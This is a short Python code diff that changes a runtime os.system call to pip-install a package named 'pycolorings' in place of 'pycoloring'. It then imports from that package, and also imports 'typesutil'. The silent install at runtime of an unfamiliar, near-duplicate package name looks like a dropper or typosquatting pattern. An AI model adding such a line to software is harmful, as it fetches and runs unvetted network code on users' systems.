@@ -1,6 +1,6 @@
 import os
-os.system(f"pip install pycoloring")
-from pycoloring import color
+os.system(f"pip install pycolorings")
+from pycolorings import color
 try:
     import requests
     import typesutil
